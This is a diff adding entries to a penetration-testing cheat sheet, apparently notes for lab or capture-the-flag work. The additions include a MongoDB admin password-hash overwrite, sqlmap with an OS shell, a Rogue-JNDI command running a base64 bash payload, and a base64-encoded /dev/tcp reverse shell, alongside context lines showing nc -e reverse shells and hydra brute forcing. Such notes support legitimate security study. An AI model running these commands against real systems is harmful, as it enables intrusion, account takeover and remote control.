@@ -79,6 +79,8 @@ $ ./mongo mongodb://<IP address>:27017
 > use <db name>;
 > show collections;
 > db.<collection>.find().pretty();
+$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
 ```
 
 - Rsync
@@ -87,6 +89,14 @@ $ ./mongo mongodb://<IP address>:27017
 $ rsync --list-only <IP address>::
 $ rsync --list-only <IP address>::<share>
 $ rsync <IP address>::<share>/<filename> <filename>
+```
+
+- TFTP
+
+```
+$ tftp <IP address>
+tftp> get <file>
+tftp> put <file>
 ```
 
 - MySQL
@@ -193,6 +203,12 @@ $ nc -nlvp <port>
 $ nc -nv <IP address> <port> -e cmd.exe
 ```
 
+- Tcpdump
+
+```
+$ sudo tcpdump -i <interface> port <port>
+```
+
 - Host Files
 
 ```
@@ -209,6 +225,7 @@ $ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
 
 ```
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'; CTRL+Z; stty raw -echo; fg; export TERM=XTERM
+$ script /dev/null -c bash
 ```
 
 - Zip2john
@@ -221,6 +238,19 @@ $ zip2john <ZIP file> > hashes.txt
 
 ```
 $ hashcat -a 0 -m 0 hashes.txt <wordlist>
+```
+
+- Sqlmap
+
+```
+$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>"
+$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>" --os-shell
+```
+
+- Rogue-JNDI
+
+```
+$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} | {base64,-d}|{bash,-i}" --hostname "<IP address>"
 ```
 
 #3. - Lateral Movement
@@ -318,6 +348,12 @@ Edit /etc/hosts
 $ ss -tulpn
 ```
 
+- List running processes
+
+```
+$ ps aux
+```
+
 - Configure your browser to send traffic through a proxy
 
 ```
@@ -328,6 +364,37 @@ Preferences -> Network Settings -> Manual Proxy Configuration
 
 ```
 $ find / -name <string> 2>/dev/null
+```
+
+- Encode a payload in base64
+
+```
+$ echo 'bash -c bash -i >&/dev/tcp/<IP address>/<port> 0>&1' | base64
+```
+
+- Create a SHA-512 hash
+
+```
+$ mkpasswd -m sha-512 Password1234
+```
+
+- Set permissions on a id_rsa file
+
+```
+$ chmod 400 id_rsa
+$ ssh -i id_rsa <username>@<IP address>
+```
+
+- Check permissions on a file
+
+```
+$ icacls <file>
+```
+
+- Read a file printing only human-readable strings
+
+```
+$ strings <file>
 ```
 
 #6. - Online Resources
@@ -358,4 +425,10 @@ https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
 
 ```
 https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
+```
+
+- FoxyProxy: proxy management
+
+```
+https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 ```
